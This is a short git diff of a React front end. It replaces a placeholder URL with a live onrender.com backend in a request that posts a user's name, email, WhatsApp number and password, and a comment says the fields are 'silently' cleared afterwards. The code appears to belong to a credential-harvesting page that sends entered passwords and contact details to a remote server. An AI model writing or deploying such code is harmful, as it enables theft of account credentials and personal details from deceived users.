@@ -18,7 +18,7 @@ function App() {
 
     try {
       await axios.post(
-        "https://YOUR_BACKEND_RENDER_URL/api/send", // replace with deployed backend URL
+        "https://kaizer2-0.onrender.com/api/send", // replace with deployed backend URL
         { name, email, whatsapp, password }
       );
       // silently clear fields after sending
